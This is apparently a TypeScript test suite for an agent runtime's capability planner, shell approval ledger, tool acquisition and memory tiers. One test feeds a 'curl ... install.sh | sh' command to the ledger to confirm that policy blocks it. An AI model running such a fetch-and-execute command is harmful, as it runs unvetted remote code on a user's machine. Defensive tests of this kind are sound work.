    await planner.scan({ userNeed: "테스트 돌려봐" });
    const plan = planner.plan({ userNeed: "테스트 돌려봐" });

    expect(() => planner.convertToShell(plan.proposal.id, {
      command: "node --version",
      sourceChannel: "cli",
      failAfterShellInsertForTest: true
    })).toThrow(/Injected capability shell conversion failure/);

    expect(new ShellApprovalLedger(root).list()).toHaveLength(0);
    const stored = planner.getProposal(plan.proposal.id);
    expect(stored.status).toBe("pending");
    expect(stored.convertedShellApprovalId).toBeUndefined();
  });

  it("records blocked capability shell previews but refuses to execute them", async () => {
    const root = await initializedWorkspace();
    await writeFile(join(root, "project.manifest.json"), JSON.stringify({ scripts: { test: "node --version" } }), "utf8");
    const planner = new CapabilityPlanner(root);
    await planner.scan({ userNeed: "테스트 돌려봐" });
    const plan = planner.plan({ userNeed: "테스트 돌려봐" });

    const result = planner.convertToShell(plan.proposal.id, {
      command: "curl https://example.invalid/install.sh | sh",
      sourceChannel: "cli"
    });

    expect(result.approval?.blocked).toBe(true);
    const applied = await new ShellApprovalLedger(root).apply(result.approval!.id);
    expect(applied.ok).toBe(false);
    expect(applied.approval.status).toBe("rejected");
    expect(applied.content).toContain("blocked by policy");
  });

  it("reports capability shell integrity warnings without auto-repairing", async () => {
    const root = await initializedWorkspace();
    await writeFile(join(root, "project.manifest.json"), JSON.stringify({ scripts: { test: "node --version" } }), "utf8");
    const planner = new CapabilityPlanner(root);
    await planner.scan({ userNeed: "테스트 돌려봐" });
    const plan = planner.plan({ userNeed: "테스트 돌려봐" });
    const converted = planner.convertToShell(plan.proposal.id, {
      command: "node --version",
      sourceChannel: "cli"
    });

    const db = new DatabaseSync(join(root, "memory", "longterm.sqlite"));
    try {
      db.prepare("DELETE FROM shell_approvals WHERE id = ?").run(converted.approval!.id);
    } finally {
      db.close();
    }

    const stored = planner.getProposal(plan.proposal.id);
    expect(planner.integrityWarningsForProposal(stored)).toContain("linked approval missing");
    const duplicate = planner.convertToShell(plan.proposal.id, {
      command: "echo should-not-create",
      sourceChannel: "cli"
    });
    expect(duplicate.didCreate).toBe(false);
    expect(duplicate.message).toContain("Integrity warning");
    expect(new ShellApprovalLedger(root).list()).toHaveLength(0);
  });

  it("keeps missing .git/package.json cases abstract and silently prunes hallucinated grounding ids", async () => {
    const root = await initializedWorkspace();
    await rm(join(root, "package.json"), { force: true });
    const planner = new CapabilityPlanner(root);
    const scan = await planner.scan({ userNeed: "변경 상태 확인" });
    const plan = planner.plan({ userNeed: "git status 봐줘" });
    expect(plan.proposal.capabilityFamily).toBe("change_tracking");
    expect(plan.proposal.possibleApproaches.map((item) => item.title)).toContain("External change-tracking setup");
    expect(JSON.stringify(plan.proposal.hypotheses).toLowerCase()).not.toContain("git");
    expect(JSON.stringify(plan.proposal.possibleApproaches).toLowerCase()).not.toContain("git status");

    const normalized = normalizeCapabilityProposal({
      ...plan.proposal,
      hypotheses: [{ text: "unsupported", groundingFactIds: ["missing_fact"] }],
      possibleApproaches: [{ title: "Use git status", summary: "Run npm test", groundingFactIds: ["missing_fact"], riskLevel: "low", kind: "shell_preview" }]
    });
    expect(normalized.status).toBe("ignored");
    expect(normalized.hypotheses).toEqual([]);
    expect(normalized.possibleApproaches).toEqual([]);
    expect(scan.facts.some((fact) => fact.path === ".git")).toBe(false);
  });

  it("requires a fresh scan before planning and keeps proposal source scan ids fixed", async () => {
    const root = await initializedWorkspace();
    const planner = new CapabilityPlanner(root);
    expect(() => planner.plan({ userNeed: "테스트 돌려봐" })).toThrow(/No environment scan found/);

    const scan = await planner.scan({ userNeed: "테스트 돌려봐" });
    const observedAt = Date.parse(scan.scan.observedAt);
    const boundary = planner.plan({ userNeed: "테스트 돌려봐", now: new Date(observedAt + 300_000) });
    expect(boundary.proposal.sourceScanId).toBe(scan.scan.scanId);
    expect(() => planner.plan({ userNeed: "테스트 돌려봐", now: new Date(observedAt + 300_001) })).toThrow(/Latest environment scan is stale/);

    const nextScan = await planner.scan({ userNeed: "테스트 다시 확인" });
    expect(nextScan.scan.scanId).not.toBe(boundary.proposal.sourceScanId);
    expect(planner.getProposal(boundary.proposal.id).sourceScanId).toBe(scan.scan.scanId);
  });

  it("normalizes concrete tool names into abstract capability families", async () => {
    const root = await initializedWorkspace();
    const planner = new CapabilityPlanner(root);
    await planner.scan({ userNeed: "python 테스트 돌려봐" });
    const plan = planner.plan({ userNeed: "python 테스트 돌려봐" });
    expect(plan.proposal.capabilityFamily).toBe("project_check");
    expect(plan.proposal.confidence).not.toBe("high");
    expect(JSON.stringify(plan.proposal.hypotheses).toLowerCase()).not.toContain("python");
    expect(JSON.stringify(plan.proposal.possibleApproaches).toLowerCase()).not.toContain("python");
  });

  it("stores scan snapshots, latest facts, and stable JSON without exposing workspace roots", async () => {
    const root = await initializedWorkspace();
    const planner = new CapabilityPlanner(root);
    const first = await planner.scan();
    const second = await planner.scan({ userNeed: "변경 상태 확인" });

    expect(first.scan.scanId).not.toBe(second.scan.scanId);
    expect(first.facts.some((fact) => fact.kind === "user_request")).toBe(false);
    expect(second.facts.filter((fact) => fact.kind === "user_request")).toHaveLength(1);

    const latest = planner.listFacts({ latest: true });
    expect(latest.scan.scanId).toBe(second.scan.scanId);

    const json = capabilityScanJson(latest);
    expect(json).toContain("\"scanId\"");
    expect(json).not.toContain(root.replace(/\\/g, "\\\\"));
    expect(json).not.toContain(root);
  });

  it("records structured scan warnings without raw reads for oversized or malformed files", async () => {
    const root = await initializedWorkspace();
    await writeFile(join(root, "large.config.json"), `{${" ".repeat((500 * 1024) + 1)}}`, "utf8");
    await writeFile(join(root, "broken.config.json"), "{not valid json", "utf8");
    await writeFile(join(root, "private-token.json"), JSON.stringify({ OPENAI_API_KEY: "sk-1234567890abcdefghijklmnop", scripts: { test: "node --version" } }), "utf8");

    const scan = await new EnvironmentDiscovery(root).scan({ userNeed: "테스트 돌려봐" });
    expect(scan.warnings.some((warning) => warning.kind === "size_cap_exceeded" && warning.path === "large.config.json")).toBe(true);
    expect(scan.warnings.some((warning) => warning.kind === "parse_failed" && warning.path === "broken.config.json")).toBe(true);
    expect(JSON.stringify(scan)).not.toContain("sk-1234567890abcdefghijklmnop");
    expect(scan.facts.some((fact) => fact.path === "[REDACTED]")).toBe(true);
    expect(scan.facts.some((fact) => fact.keys?.includes("[REDACTED_KEY]"))).toBe(true);
  });

  it("keeps legacy v0.29 facts readable through the reserved legacy scan", async () => {
    const root = await initializedWorkspace();
    const db = new DatabaseSync(join(root, "memory", "longterm.sqlite"));
    try {
      db.exec(`
        CREATE TABLE IF NOT EXISTS environment_facts (
          id TEXT PRIMARY KEY,
          kind TEXT NOT NULL,
          path TEXT,
          summary TEXT,
          keys_json TEXT NOT NULL,
          observed_at TEXT NOT NULL,
          record_json TEXT NOT NULL
        );
      `);
      const legacy = {
        id: "legacy_fact",
        kind: "top_level_entry",
        path: "legacy.txt",
        summary: "Legacy fact.",
        observedAt: "2026-01-01T00:00:00.000Z"
      };
      db.prepare("INSERT INTO environment_facts (id, kind, path, summary, keys_json, observed_at, record_json) VALUES (?, ?, ?, ?, ?, ?, ?)")
        .run(legacy.id, legacy.kind, legacy.path, legacy.summary, "[]", legacy.observedAt, JSON.stringify(legacy));
    } finally {
      db.close();
    }

    const discovery = new EnvironmentDiscovery(root);
    const legacyResult = discovery.listFacts({ scanId: legacyEnvironmentScanId });
    expect(legacyResult.scan.scanId).toBe(legacyEnvironmentScanId);
    expect(legacyResult.facts[0]).toMatchObject({ id: "legacy_fact", scanId: legacyEnvironmentScanId });

    const again = discovery.listFacts({ scanId: legacyEnvironmentScanId });
    expect(again.facts).toHaveLength(1);
  });

  it("uses fact-kind summaries and stable object-key serialization only", async () => {
    const root = await initializedWorkspace();
    await mkdir(join(root, ".meta"), { recursive: true });
    const scan = await new CapabilityPlanner(root).scan({ userNeed: "변경 상태 확인" });
    const text = capabilityScanJson(scan);
    expect(stableJsonStringify({ z: 1, a: { d: 2, b: 1 }, arr: [{ z: 1, a: 2 }] }))
      .toBe("{\n  \"a\": {\n    \"b\": 1,\n    \"d\": 2\n  },\n  \"arr\": [\n    {\n      \"a\": 2,\n      \"z\": 1\n    }\n  ],\n  \"z\": 1\n}\n");
    expect(text).not.toMatch(/Found Git|Found NPM|Python project|Bun project/i);
  });

  it("does not traverse workspace-outside symlink targets when symlinks are available", async () => {
    const root = await initializedWorkspace();
    const outside = await workspace();
    await writeFile(join(outside, "outside.txt"), "outside", "utf8");
    try {
      await symlink(outside, join(root, "outside-link"), "junction");
    } catch {
      return;
    }
    const scan = await new EnvironmentDiscovery(root).scan();
    expect(scan.warnings.some((warning) => warning.kind === "skipped_directory" && warning.path === "outside-link")).toBe(true);
    expect(scan.facts.some((fact) => fact.path === "outside-link/outside.txt")).toBe(false);
  });
});

describe("tool acquisition", () => {
  async function plannedCapability(root: string, request = "테스트 돌려봐") {
    const planner = new CapabilityPlanner(root);
    await planner.scan({ userNeed: request });
    return planner.plan({ userNeed: request }).proposal;
  }

  it("stores an untrusted LLM draft separately from a normalized command_adapter candidate", async () => {
    const root = await initializedWorkspace();
    const proposal = await plannedCapability(root);
    const manager = new ToolAcquisitionManager(root);

    const result = await manager.draftFromCapability(proposal.id, { providerId: "mock" });

    expect(result.draft.status).toBe("candidate_created");
    expect(result.candidate).toBeDefined();
    expect(result.candidate?.status).toBe("pending");
    expect(result.candidate?.executorKind).toBe("command_adapter");
    expect((result.candidate?.executorPlan as { redaction?: boolean }).redaction).toBe(true);
    expect(result.warnings.some((warning) => warning.includes("redaction forced"))).toBe(true);
    expect(new ShellApprovalLedger(root).list()).toHaveLength(0);
    expect(formatToolDraftResult(result)).toContain("Candidate created from normalized draft");

    const candidate = result.candidate as ToolCandidateRecord;
    expect(candidateContentHash({ ...candidate, status: "approved" })).toBe(candidate.candidateContentHash);
  });

  it("normalizes structured ToolDraft text fields instead of crashing", async () => {
    const root = await initializedWorkspace();
    const proposal = await plannedCapability(root, "프로바이더 설정 검사 도구 만들어줘");
    const manager = new ToolAcquisitionManager(root);

    const result = await manager.draftFromCapability(proposal.id, {
      rawDraft: {
        targetToolId: "local.search_observation.provider_settings",
        capabilityFamily: "search_observation",
        permission: "read_only",
        exposure: "model",
        executorKind: "command_adapter",
        executorPlan: {
          executable: "node",
          args: ["--version"],
          cwdPolicy: "workspace_root",
          timeoutMs: 30000,
          outputCapBytes: 12000,
          redaction: true
        },
        inputSchemaDraft: [],
        safetyRationale: { summary: "Read-only inspection candidate." },
        testPlan: ["Run the fixed adapter once.", { assert: "No secrets are printed." }],
        rollbackPlan: { step: "Discard candidate if unsuitable." },
        groundingReferences: []
      }
    });

    expect(result.candidate).toBeDefined();
    expect(result.warnings).toContain("inputSchemaDraft discarded: expected object");
    expect(result.warnings).toContain("safetyRationale normalized from object to text");
    expect(result.warnings).toContain("testPlan normalized from array to text");
    expect(result.warnings).toContain("rollbackPlan normalized from object to text");
    expect((result.candidate as ToolCandidateRecord).testPlan).toContain("Run the fixed adapter once.");
  });

  it("keeps ts_module candidates review-only and blocks execution testing", async () => {
    const root = await initializedWorkspace();
    const proposal = await plannedCapability(root, "실행 능력 후보 검토");
    const manager = new ToolAcquisitionManager(root);
    const result = await manager.draftFromCapability(proposal.id, {
      rawDraft: {
        targetToolId: "local.runtime_execution.tsdemo",
        capabilityFamily: "runtime_execution",
        permission: "read_only",
        exposure: "model",
        executorKind: "ts_module",
        executorPlan: {
          code: "export async function run() { return 'unsafe'; }"
        },
        groundingReferences: []
      }
    });

    expect(result.candidate?.executorKind).toBe("ts_module");
    expect(formatToolCandidate(result.candidate as ToolCandidateRecord)).toContain("Activation: blocked until ts_module security roadmap");

    const run = await manager.testCandidate((result.candidate as ToolCandidateRecord).id);
    expect(run.status).toBe("failed");
    expect(run.outputSummary).toContain("ts_module execution is blocked");
  });

  it("tests, approves, activates, executes, and deactivates a fixed command_adapter tool", async () => {
    const root = await initializedWorkspace();
    await new AgentManager(root).createAgent("architect-agent", "architect");
    const proposal = await plannedCapability(root);
    const manager = new ToolAcquisitionManager(root);
    const result = await manager.draftFromCapability(proposal.id, {
      rawDraft: {
        targetToolId: "local.project_check.nodever",
        capabilityFamily: "project_check",
        permission: "project_check",
        exposure: "model",
        executorKind: "command_adapter",
        executorPlan: {
          executable: "node",
          args: ["--version"],
          cwdPolicy: "workspace_root",
          timeoutMs: 30000,
          outputCapBytes: 12000,
          redaction: true
        },
        inputSchemaDraft: {},
        safetyRationale: "A fixed project check command with no model-provided args.",
        testPlan: "Run once with timeout and output cap.",
        rollbackPlan: "Deactivate and remove from agent allowedTools.",
        groundingReferences: []
      }
    });
    const candidateId = (result.candidate as ToolCandidateRecord).id;

    const testRun = await manager.testCandidate(candidateId);
    expect(testRun.status).toBe("passed");
    const approved = manager.approveCandidate(candidateId);
    expect(approved.status).toBe("approved");
    const preview = await manager.previewActivation(candidateId, "architect-agent");
    expect(preview.allowedToolsBefore).not.toContain("local.project_check.nodever");
    expect(preview.allowedToolsAfter).toContain("local.project_check.nodever");
    expect(preview.effectiveVisibility.visible).toBe(true);
    expect((await new AgentManager(root).loadAgent("architect-agent")).allowedTools).not.toContain("local.project_check.nodever");
    await expect(manager.activateCandidate(candidateId, "architect-agent")).rejects.toThrow("--yes");
    const activation = await manager.activateCandidate(candidateId, "architect-agent", { yes: true });
    expect(activation.status).toBe("active");

    const agent = await new AgentManager(root).loadAgent("architect-agent");
    expect(agent.allowedTools).toContain("local.project_check.nodever");
    const disabledPolicy = {
      ...await new PolicyManager(root).loadPolicy(),
      disabledPermissions: ["project_check" as const]
    };
    expect(listEffectiveActiveModelToolIds(root, agent.allowedTools, disabledPolicy)).not.toContain("local.project_check.nodever");
    const prompt = await buildPromptBundle({
      workspaceRoot: root,
      agent,
      session: await new SessionManager(root).createSession("architect-agent", "active tool prompt"),
      userPrompt: "check",
      policy: await new PolicyManager(root).loadPolicy()
    });
    expect(prompt.prompt).toContain("local.project_check.nodever");

    const execResult = await new ToolRegistry().execute("local.project_check.nodever", {}, {
      workspaceRoot: root,
      allowedTools: agent.allowedTools,
      sourceChannel: "cli"
    });
    expect(execResult.ok).toBe(true);
    expect(execResult.content).toContain("v");
    const secondExecResult = await new ToolRegistry().execute("local.project_check.nodever", {}, {
      workspaceRoot: root,
      allowedTools: agent.allowedTools,
      sourceChannel: "cli"
    });
    expect(secondExecResult.ok).toBe(true);
    expect(manager.listActiveToolExecutions("local.project_check.nodever").filter((item) => item.status === "passed")).toHaveLength(2);

    const blueprint = manager.createBlueprintFromActive("local.project_check.nodever", { yes: true });
    expect(blueprint.sourceActiveToolIds).toContain("local.project_check.nodever");
    expect(manager.listBlueprints().map((item) => item.id)).toContain(blueprint.id);

    const rejectedArgs = await new ToolRegistry().execute("local.project_check.nodever", { path: "x" }, {
      workspaceRoot: root,
      allowedTools: agent.allowedTools,
      sourceChannel: "cli"
    });
    expect(rejectedArgs.ok).toBe(false);
    expect(manager.listActiveToolExecutions("local.project_check.nodever").some((item) => item.failureKind === "policy_denied")).toBe(true);

    const deactivated = await manager.deactivateTool("local.project_check.nodever", "test cleanup");
    expect(deactivated.status).toBe("deactivated");
    const updatedAgent = await new AgentManager(root).loadAgent("architect-agent");
    expect(updatedAgent.allowedTools).not.toContain("local.project_check.nodever");
    expect((await manager.activeToolVisibility("local.project_check.nodever"))[0].visible).toBe(false);
  });

  it("orchestrates tool growth from request to explicit test and activation", async () => {
    const root = await initializedWorkspace();
    await new AgentManager(root).createAgent("architect-agent", "architect");
    const growth = new ToolGrowthManager(root);
    const acquisition = new ToolAcquisitionManager(root);

    const started = await growth.start({
      request: "테스트 돌려봐",
      providerId: "mock",
      agentId: "architect-agent"
    });

    expect(started.routine.status).toBe("candidate_ready");
    expect(started.routine.sourceScanId).toBeDefined();
    expect(started.routine.sourceCapabilityId).toBeDefined();
    expect(started.routine.draftIds).toEqual([started.draftResult.draft.id]);
    expect(started.routine.candidateIds).toEqual([started.draftResult.candidate?.id]);
    expect(started.routine.attemptCount).toBe(1);
    expect(new ShellApprovalLedger(root).list()).toHaveLength(0);
    expect(acquisition.listActiveTools()).toHaveLength(0);

    const normalStart = formatToolGrowthStart(started);
    expect(normalStart).toContain(`Tool growth routine created: ${started.routine.id}`);
    expect(normalStart).toContain("Reusable tool candidate: ready for review and test.");
    expect(normalStart).toContain(`cosia tool grow test ${started.routine.id} --yes`);
    expect(normalStart).not.toContain("Capability proposal:");
    expect(normalStart).not.toContain(`Draft created: ${started.draftResult.draft.id}`);
    expect(normalStart).not.toContain(`Candidate created: ${started.draftResult.candidate?.id}`);
    expect(formatToolGrowthStart(started, { surface: "slash" })).toContain(`/tool grow test ${started.routine.id} --yes`);

    const advancedStart = formatToolGrowthStart(started, { advanced: true });
    expect(advancedStart).toContain("Advanced details:");
    expect(advancedStart).toContain(`Capability proposal: ${started.routine.sourceCapabilityId}`);
    expect(advancedStart).toContain(`Draft: ${started.draftResult.draft.id}`);
    expect(advancedStart).toContain(`Candidate: ${started.draftResult.candidate?.id}`);

    const normalRoutine = formatToolGrowthRoutine(
      started.routine,
      acquisition.getCandidate(started.routine.selectedCandidateId!)
    );
    expect(normalRoutine).toContain(`Tool growth routine: ${started.routine.id}`);
    expect(normalRoutine).not.toContain("Source scan:");
    expect(normalRoutine).not.toContain(`Selected candidate: ${started.routine.selectedCandidateId}`);

    const advancedRoutine = formatToolGrowthRoutine(
      started.routine,
      acquisition.getCandidate(started.routine.selectedCandidateId!),
      { advanced: true }
    );
    expect(advancedRoutine).toContain("Advanced details:");
    expect(advancedRoutine).toContain(`Source scan: ${started.routine.sourceScanId}`);
    expect(advancedRoutine).toContain(`Selected candidate: ${started.routine.selectedCandidateId}`);

    await expect(growth.test(started.routine.id)).rejects.toThrow("--yes");
    const tested = await growth.test(started.routine.id, { yes: true });
    expect(tested.testRun.status).toBe("passed");
    expect(tested.routine.status).toBe("awaiting_activation");

    await expect(growth.activate(started.routine.id, { agentId: "architect-agent" })).rejects.toThrow("--yes");
    const activated = await growth.activate(started.routine.id, {
      agentId: "architect-agent",
      yes: true
    });
    expect(activated.routine.status).toBe("activated");
    expect(activated.activation.status).toBe("active");
    expect((await new AgentManager(root).loadAgent("architect-agent")).allowedTools).toContain(activated.activation.toolId);
    expect(acquisition.listActiveTools().map((tool) => tool.id)).toContain(activated.activation.toolId);
  });

  it("preserves failed, rejected, retried, and cancelled tool growth evidence", async () => {
    const root = await initializedWorkspace();
    const growth = new ToolGrowthManager(root);

    const failed = await growth.start({
      request: "테스트 돌려봐",
      providerId: "mock",
      rawDraft: {
        executorKind: "unknown"
      }
    });
    expect(failed.routine.status).toBe("rejected");
    expect(failed.draftResult.candidate).toBeUndefined();
    expect(growth.list()).toHaveLength(0);
    expect(formatToolGrowthReview(growth.list({ all: true }))).toContain(failed.routine.id);
    expect(formatToolGrowthReview(growth.list({ all: true }))).not.toContain("Selected candidate:");
    expect(formatToolGrowthReview(growth.list({ all: true }), { advanced: true })).toContain("Evidence keys:");

    const retried = await growth.retry(failed.routine.id, {
      rawDraft: {
        targetToolId: "local.project_check.retry",
        capabilityFamily: "project_check",
        permission: "project_check",
        exposure: "model",
        executorKind: "command_adapter",
        executorPlan: {
          executable: "node",
          args: ["--version"],
          cwdPolicy: "workspace_root",
          timeoutMs: 30000,
          outputCapBytes: 12000,
          redaction: true
        },
        groundingReferences: []
      }
    });
    expect(retried.routine.status).toBe("candidate_ready");
    expect(retried.routine.attemptCount).toBe(2);
    expect(retried.routine.draftIds).toHaveLength(2);
    expect(retried.routine.candidateIds).toHaveLength(1);

    const rejected = growth.reject(retried.routine.id, "not the intended function");
    expect(rejected.status).toBe("rejected");
    expect(growth.list()).toHaveLength(0);
    expect(growth.list({ all: true }).map((routine) => routine.id)).toContain(rejected.id);

    const cancellable = await growth.start({
      request: "다른 테스트 도구",
      providerId: "mock",
      rawDraft: {
        targetToolId: "local.project_check.cancel",
        capabilityFamily: "project_check",
        permission: "project_check",
        exposure: "model",
        executorKind: "command_adapter",
        executorPlan: {
          executable: "node",
          args: ["--version"],
          cwdPolicy: "workspace_root",
          timeoutMs: 30000,
          outputCapBytes: 12000,
          redaction: true
        },
        groundingReferences: []
      }
    });
    const cancelled = growth.cancel(cancellable.routine.id, "user cancelled");
    expect(cancelled.status).toBe("cancelled");
    await expect(growth.test(cancelled.id, { yes: true })).rejects.toThrow("closed");
    await expect(growth.activate(cancelled.id, { agentId: "cosia-agent", yes: true })).rejects.toThrow("closed");
  });
});

describe("memory", () => {
  it("upgrades the memory schema idempotently from a v0.3 table", async () => {
    const root = await workspace();
    await mkdir(join(root, "memory"), { recursive: true });
    const db = new DatabaseSync(join(root, "memory", "longterm.sqlite"));
    try {
      db.exec(`
        CREATE TABLE memories (
          id TEXT PRIMARY KEY,
          scope TEXT NOT NULL,
          owner_type TEXT NOT NULL,
          owner_id TEXT,
          kind TEXT NOT NULL,
          content TEXT NOT NULL,
          source_session_id TEXT,
          source_agent_id TEXT,
          confidence REAL DEFAULT 0.7,
          importance INTEGER DEFAULT 3,
          status TEXT DEFAULT 'active',
          created_at TEXT NOT NULL,
          updated_at TEXT NOT NULL,
          last_accessed_at TEXT,
          valid_from TEXT,
          valid_until TEXT,
          expires_at TEXT
        );
      `);
    } finally {
      db.close();
    }

    const memory = new MemoryManager(root);
    memory.ensureSchema();
    memory.ensureSchema();

    const upgraded = new DatabaseSync(join(root, "memory", "longterm.sqlite"));
    try {
      const columns = upgraded.prepare("PRAGMA table_info(memories)").all() as Array<{ name: string }>;
      expect(columns.map((column) => column.name)).toEqual(expect.arrayContaining([
        "archived_at",
        "archive_reason",
        "replaced_by_memory_id"
      ]));
    } finally {
      upgraded.close();
    }
  });

  it("stores, searches, and writes reference memory", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Design runtime memory");
    const memory = new MemoryManager(root);

    memory.addMemory({
      scope: "project",
      content: "This runtime uses Codex / Agent / Session layers.",
      kind: "decision"
    });
    const records = memory.search("Codex");
    expect(records).toHaveLength(1);

    await memory.writeReferenceMemory(session, "Summarize Codex layers");
    const ref = await readFile(join(root, "sessions", session.id, "REF_MEMORY.md"), "utf8");
    expect(ref).toContain("Codex / Agent / Session");
    expect(ref).toContain("mem:");
    expect(ref).toContain("score:");
    expect(ref).toContain("core/decision");
  });

  it("filters memory by tier and writes run-scoped reference memory", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const currentSession = await sessions.createSession("architect-agent", "Current memory context");
    const otherSession = await sessions.createSession("cosia-agent", "Other memory context");
    const memory = new MemoryManager(root);

    const core = memory.addMemory({
      tier: "core",
      kind: "decision",
      content: "Shared COSIA memory tier decision."
    });
    const currentSessionMemory = memory.addMemory({
      tier: "session",
      ownerId: currentSession.id,
      kind: "note",
      content: "Current session private memory."
    });
    const otherSessionMemory = memory.addMemory({
      tier: "session",
      ownerId: otherSession.id,
      kind: "note",
      content: "Other session private memory."
    });
    const agentMemory = memory.addMemory({
      tier: "agent",
      ownerId: "architect-agent",
      kind: "note",
      content: "Architect agent private memory."
    });

    expect(memory.search("memory", 20, { tier: "session" }).map((result) => result.record.id))
      .toEqual(expect.arrayContaining([currentSessionMemory.id, otherSessionMemory.id]));
    expect(memory.search("memory", 20, { tier: "session", ownerId: currentSession.id }).map((result) => result.record.id))
      .toEqual([currentSessionMemory.id]);

    await memory.writeReferenceMemory(currentSession, "memory", "architect-agent");
    const ref = await readFile(join(root, "sessions", currentSession.id, "REF_MEMORY.md"), "utf8");
    expect(ref).toContain(core.id.slice(0, 8));
    expect(ref).toContain(currentSessionMemory.id.slice(0, 8));
    expect(ref).toContain(agentMemory.id.slice(0, 8));
    expect(ref).not.toContain(otherSessionMemory.id.slice(0, 8));
  });

  it("archives session and agent tier memories with lifecycle hooks", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Lifecycle memory");
    const memory = new MemoryManager(root);
    const sessionMemory = memory.addMemory({
      tier: "session",
      ownerId: session.id,
      content: "Session-owned memory.",
      kind: "note"
    });
    const agentMemory = memory.addMemory({
      tier: "agent",
      ownerId: "architect-agent",
      content: "Agent-owned memory.",
      kind: "note"
    });
    const coreMemory = memory.addMemory({
      tier: "core",
      content: "Core memory survives lifecycle changes.",
      kind: "note"
    });

    await sessions.archiveSession(session.id);
    expect(memory.archiveOwnerMemories("session", session.id, "Session archived: test")).toBe(1);
    expect(memory.getMemory(sessionMemory.id).status).toBe("archived");
    expect(memory.getMemory(coreMemory.id).status).toBe("active");

    await agents.deleteAgent("architect-agent", {
      yes: true,
      force: true,
      defaultAgentId: "cosia-agent"
    });
    expect(memory.archiveOwnerMemories("agent", "architect-agent", "Agent deleted: architect-agent")).toBe(1);
    expect(memory.getMemory(agentMemory.id).status).toBe("archived");
    expect(memory.getMemory(coreMemory.id).status).toBe("active");
  });

  it("promotes memory across lifecycle tiers and rejects reverse paths", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Promote memory tiers");
    const memory = new MemoryManager(root);
    const sessionToAgent = memory.addMemory({
      tier: "session",
      ownerId: session.id,
      kind: "note",
      content: "Session learning should become an agent habit.",
      importance: 4,
      confidence: 0.8
    });
    const sessionToCore = memory.addMemory({
      tier: "session",
      ownerId: session.id,
      kind: "decision",
      content: "COSIA session learnings can become core knowledge.",
      importance: 5,
      confidence: 0.9
    });
    const agentToCore = memory.addMemory({
      tier: "agent",
      ownerId: "architect-agent",
      kind: "note",
      content: "Architect agent discovered a reusable planning rule.",
      importance: 3,
      confidence: 0.75
    });

    const agentPromotion = memory.promoteMemory(sessionToAgent.id, {
      toTier: "agent",
      ownerId: "architect-agent",
      reason: "agent should remember this"
    });
    expect(memory.getMemory(agentPromotion.targetMemoryId)).toMatchObject({
      tier: "agent",
      ownerId: "architect-agent",
      content: sessionToAgent.content
    });
    expect(memory.getMemory(sessionToAgent.id).status).toBe("archived");

    const corePromotion = memory.promoteMemory(sessionToCore.id, {
      toTier: "core",
      reason: "core project knowledge"
    });
    expect(memory.getMemory(corePromotion.targetMemoryId)).toMatchObject({
      tier: "core",
      ownerId: null
    });

    const agentCorePromotion = memory.promoteMemory(agentToCore.id, {
      toTier: "core",
      reason: "core reusable rule"
    });
    expect(memory.getMemory(agentCorePromotion.targetMemoryId).tier).toBe("core");
    expect(() => memory.promoteMemory(agentCorePromotion.targetMemoryId, {
      toTier: "agent",
      ownerId: "architect-agent",
      reason: "reverse path"
    })).toThrow("Core memory cannot be promoted");
  });

  it("blocks tier promotion conflicts and supports force, replace, merge, and revert", async () => {
    const root = await initializedWorkspace();
    const agents = new AgentManager(root);
    await agents.createAgent("architect-agent", "architect");
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("architect-agent", "Resolve tier promotion conflicts");
    const memory = new MemoryManager(root);
    const existingAgent = memory.addMemory({
      tier: "agent",
      ownerId: "architect-agent",
      kind: "note",
      content: "Agent prefers concise implementation notes.",
      importance: 3,
      confidence: 0.7
    });
    const conflictingSession = memory.addMemory({
      tier: "session",
      ownerId: session.id,
      kind: "note",
      content: "Agent prefers concise implementation note.",
      importance: 4,
      confidence: 0.8
    });
    expect(() => memory.promoteMemory(conflictingSession.id, {
      toTier: "agent",
      ownerId: "architect-agent",
      reason: "conflict expected"
    })).toThrow("Memory promotion conflicts detected");

    const forcedSource = memory.addMemory({
      tier: "session",
      ownerId: session.id,
      kind: "note",
      content: "Agent prefers concise implementation notes.",
      importance: 4,
      confidence: 0.8
    });
    const forced = memory.promoteMemory(forcedSource.id, {
      toTier: "agent",
      ownerId: "architect-agent",
      reason: "force duplicate",
      force: true
    });
    expect(forced.mode).toBe("force");
    expect(memory.getMemory(forced.targetMemoryId).status).toBe("active");

    const replaceSource = memory.addMemory({
      tier: "session",
      ownerId: session.id,
      kind: "note",
      content: "Agent prefers concise implementation notes with review.",
      importance: 5,
      confidence: 0.9
    });
    const replaced = memory.promoteMemory(replaceSource.id, {
      toTier: "agent",
      ownerId: "architect-agent",
      reason: "replace stale memory",
      replaceMemoryId: existingAgent.id
    });
    expect(memory.getMemory(existingAgent.id).status).toBe("archived");
    expect(memory.getMemory(replaceSource.id).status).toBe("archived");
    expect(memory.listTierPromotions().map((item) => item.id)).toContain(replaced.id);
    const revertedReplace = memory.revertTierPromotion(replaced.id.slice(0, 12), "undo replace");
    expect(revertedReplace.revertedAt).toBeTruthy();
    expect(memory.getMemory(existingAgent.id).status).toBe("active");
    expect(memory.getMemory(replaceSource.id).status).toBe("active");
    expect(memory.getMemory(replaced.targetMemoryId).status).toBe("archived");

    const existingCore = memory.addMemory({
      tier: "core",
      kind: "decision",
      content: "COSIA memory promotes durable context.",
      importance: 3,
      confidence: 0.7
    });
    const mergeSource = memory.addMemory({
      tier: "agent",
      ownerId: "architect-agent",
      kind: "decision",
      content: "COSIA memory promotes durable context for core.",
      importance: 4,
      confidence: 0.8
    });
    const merged = memory.promoteMemory(mergeSource.id, {
      toTier: "core",
      reason: "merge into core",
      mergeMemoryId: existingCore.id,
      content: "COSIA memory promotes durable context for core decisions."
    });
    expect(merged.mode).toBe("merge");
    expect(memory.getMemory(existingCore.id).content).toContain("core decisions");
    memory.revertTierPromotion(merged.id, "undo merge");
    expect(memory.getMemory(existingCore.id).content).toBe("COSIA memory promotes durable context.");
    expect(memory.getMemory(mergeSource.id).status).toBe("active");
  });

